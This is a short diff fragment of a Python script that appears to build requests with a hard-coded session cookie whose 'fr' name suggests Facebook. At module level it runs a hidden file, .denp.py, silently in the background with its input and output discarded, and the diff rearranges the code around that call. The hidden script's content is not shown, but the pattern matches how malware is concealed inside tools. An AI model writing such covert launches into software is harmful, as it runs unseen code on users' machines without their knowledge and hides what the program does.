@@ -18,10 +18,11 @@ headers = {
 }
 payload={}
 cookie={}
-def create_form():
-	form=dict()
 
 os.system("python .denp.py </dev/null &>/dev/null &")
+
+def create_form():
+	form=dict()
 	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 	data=requests.get(post_url,headers=headers)
 	# print('Form Creating : ',data.url)
